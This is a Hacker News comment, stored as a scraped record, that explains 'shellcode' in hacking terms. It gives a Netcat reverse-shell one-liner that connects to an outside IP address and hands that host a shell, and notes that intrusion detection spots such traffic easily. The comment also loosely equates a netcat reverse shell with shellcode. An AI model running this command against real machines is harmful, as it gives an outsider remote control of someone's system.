Item(by='yabones', descendants=None, kids=None, score=None, time=1605104670, title=None, item_type='comment', url=None, parent=25057628, text='In &#x27;hacking&#x27; terms, shellcode is a basic means to get remote control of somebody&#x27;s machine using unconventional means.<p>The most basic example would be using Netcat:<p><pre><code>    nc -e &quot;&#x2F;bin&#x2F;sh&quot; 66.77.88.99 6789\n</code></pre>\nSimply, that allows Netcat to pipe any data from the remote host through the shell. This is obviously really bad shellcode since all the network traffic is plaintext and pretty easy for IDS systems to spot.')
